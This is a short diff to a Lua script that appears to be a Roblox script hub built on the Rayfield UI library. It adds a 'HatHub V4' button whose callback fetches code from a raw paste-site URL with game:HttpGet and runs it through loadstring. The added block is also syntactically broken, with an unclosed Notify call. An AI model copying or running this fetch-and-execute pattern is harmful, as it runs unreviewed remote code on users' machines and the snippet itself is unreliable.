@@ -95,6 +95,14 @@ local Button = Window:CreateButton({
    end,
 })
 
+local Button = Window:CreateButton({
+    Name = "HatHub V4",
+    Callback = function()
+        Rayfield:Notify({
+        loadstring(game:HttpGet("https://textbin.net/raw/rvohv1nvuf"))();
+    end,
+ })
+
 ---USER SCRIPTS
 local Section = Window:CreateSection("User Scripts")
 
